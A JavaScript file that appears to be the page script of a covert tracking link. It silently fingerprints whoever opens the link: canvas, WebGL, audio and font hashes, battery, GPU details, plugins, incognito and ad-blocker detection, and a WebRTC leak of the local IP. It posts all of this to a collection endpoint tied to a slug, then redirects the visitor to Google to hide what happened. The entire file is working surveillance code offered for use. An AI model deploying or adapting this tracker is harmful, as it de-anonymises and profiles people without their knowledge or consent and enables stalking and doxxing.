(async function () {
  "use strict";

  const SLUG     = window.__SLUG__;
  const INGEST   = window.__INGEST_URL__;
  const REDIRECT = window.__REDIRECT__ || "https://www.google.com";

  // --- Silent fingerprint collectors (no permissions required) ---

  function getCanvasHash() {
    try {
      const c = document.createElement('canvas');
      c.width = 200; c.height = 50;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Cwm fjord veg balks nth pyx quiz', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Cwm fjord veg balks nth pyx quiz', 4, 35);
      const data = c.toDataURL();
      let hash = 0;
      for (let i = 0; i < data.length; i++) {
        hash = ((hash << 5) - hash) + data.charCodeAt(i);
        hash |= 0;
      }
      return hash.toString(16);
    } catch(e) { return null; }
  }

  function getWebGL() {
    try {
      const c = document.createElement('canvas');
      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return { vendor: null, renderer: null };
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
      };
    } catch(e) { return { vendor: null, renderer: null }; }
  }

  function getAudioHash() {
    return new Promise(function (resolve) {
      try {
        var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AC) return resolve(null);
        var ctx = new AC(1, 44100, 44100);
        var osc = ctx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(10000, ctx.currentTime);
        var comp = ctx.createDynamicsCompressor();
        comp.threshold.setValueAtTime(-50, ctx.currentTime);
        comp.knee.setValueAtTime(40, ctx.currentTime);
        comp.ratio.setValueAtTime(12, ctx.currentTime);
        comp.attack.setValueAtTime(0, ctx.currentTime);
        comp.release.setValueAtTime(0.25, ctx.currentTime);
        osc.connect(comp);
        comp.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering().then(function (buf) {
          var data = buf.getChannelData(0);
          var hash = 0;
          for (var i = 4500; i < 5000; i++) {
            hash = ((hash << 5) - hash) + Math.round(data[i] * 1000000);
            hash |= 0;
          }
          resolve(hash.toString(16));
        }).catch(function () { resolve(null); });
      } catch(e) { resolve(null); }
    });
  }

  function getFontsHash() {
    try {
      var baseFonts = ['monospace', 'sans-serif', 'serif'];
      var testFonts = [
        'Arial','Verdana','Times New Roman','Courier New','Georgia',
        'Palatino','Garamond','Comic Sans MS','Impact','Lucida Console',
        'Tahoma','Trebuchet MS','Arial Black','Calibri','Cambria',
        'Consolas','Segoe UI','Roboto','Ubuntu','Helvetica'
      ];
      var c = document.createElement('canvas');
      var ctx = c.getContext('2d');
      var testStr = 'mmmmmmmmmmlli';
      var baseWidths = {};
      baseFonts.forEach(function (f) {
        ctx.font = '72px ' + f;
        baseWidths[f] = ctx.measureText(testStr).width;
      });
      var detected = [];
      testFonts.forEach(function (font) {
        for (var b = 0; b < baseFonts.length; b++) {
          ctx.font = '72px "' + font + '", ' + baseFonts[b];
          if (ctx.measureText(testStr).width !== baseWidths[baseFonts[b]]) {
            detected.push(font);
            break;
          }
        }
      });
      var hash = 0;
      var str = detected.join(',');
      for (var i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash |= 0;
      }
      return hash.toString(16);
    } catch(e) { return null; }
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return { level: null, charging: null };
      var b = await navigator.getBattery();
      return { level: b.level, charging: b.charging };
    } catch(e) { return { level: null, charging: null }; }
  }

  function getWebRTCIP() {
    return new Promise(function (resolve) {
      try {
        var pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(function (offer) { pc.setLocalDescription(offer); });
        var timeout = setTimeout(function () { pc.close(); resolve(null); }, 3000);
        pc.onicecandidate = function (e) {
          if (!e || !e.candidate) return;
          var parts = e.candidate.candidate.split(' ');
          var ip = parts[4];
          if (ip && !ip.includes(':') && ip !== '0.0.0.0') {
            clearTimeout(timeout);
            pc.close();
            resolve(ip);
          }
        };
      } catch(e) { resolve(null); }
    });
  }

  function hasAdBlocker() {
    try {
      var el = document.createElement('div');
      el.className = 'adsbox ad-placement ad_unit';
      el.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;';
      el.innerHTML = '&nbsp;';
      document.body.appendChild(el);
      var blocked = el.offsetHeight === 0 || el.clientHeight === 0;
      document.body.removeChild(el);
      return blocked;
    } catch(e) { return false; }
  }

  function detectIncognito() {
    return new Promise(function (resolve) {
      try {
        if (navigator.storage && navigator.storage.estimate) {
          navigator.storage.estimate().then(function (est) {
            resolve(est.quota < 120000000);
          }).catch(function () { resolve(false); });
        } else {
          resolve(false);
        }
      } catch(e) { resolve(false); }
    });
  }

  function getGPUInfo() {
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl');
      if (!gl) return null;
      return JSON.stringify({
        maxTexSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxViewport: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
        aliasedLineRange: Array.from(gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE)),
        aliasedPointRange: Array.from(gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE))
      });
    } catch(e) { return null; }
  }

  function getPlugins() {
    try {
      return Array.from(navigator.plugins || []).map(function (p) { return p.name; }).join(', ') || null;
    } catch(e) { return null; }
  }

  // --- Collect everything in parallel ---
  var webgl = getWebGL();
  var results = await Promise.all([
    getAudioHash(),
    getBattery(),
    getWebRTCIP(),
    detectIncognito()
  ]);
  var audioHash = results[0];
  var battery   = results[1];
  var webrtcIP  = results[2];
  var incognito = results[3];

  var payload = {
    slug:                 SLUG,
    screen_width:         screen.width,
    screen_height:        screen.height,
    language:             navigator.language || navigator.userLanguage,
    platform:             navigator.platform,
    cookie_enabled:       navigator.cookieEnabled,
    do_not_track:         navigator.doNotTrack || null,
    connection_type:      (navigator.connection && navigator.connection.effectiveType) || null,
    referrer:             document.referrer || null,
    user_agent:           navigator.userAgent,
    gps_lat:              null,
    gps_lng:              null,
    gps_accuracy:         null,
    canvas_hash:          getCanvasHash(),
    webgl_vendor:         webgl.vendor,
    webgl_renderer:       webgl.renderer,
    audio_hash:           audioHash,
    fonts_hash:           getFontsHash(),
    color_depth:          screen.colorDepth || null,
    pixel_ratio:          window.devicePixelRatio || null,
    screen_avail_w:       screen.availWidth || null,
    screen_avail_h:       screen.availHeight || null,
    touch_support:        ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
    max_touch_points:     navigator.maxTouchPoints || 0,
    hardware_concurrency: navigator.hardwareConcurrency || null,
    device_memory:        navigator.deviceMemory || null,
    timezone_offset:      new Date().getTimezoneOffset(),
    timezone_name:        Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    has_ad_blocker:       hasAdBlocker(),
    is_incognito:         incognito,
    battery_level:        battery.level,
    battery_charging:     battery.charging,
    webrtc_local_ip:      webrtcIP,
    plugins:              getPlugins(),
    gpu_info:             getGPUInfo()
  };

  try {
    await fetch(INGEST, {
      method:    'POST',
      headers:   { 'Content-Type': 'application/json' },
      body:      JSON.stringify(payload),
      keepalive: true,
    });
  } catch (_) {}

  setTimeout(function () {
    window.location.replace(REDIRECT);
  }, 800);
})();
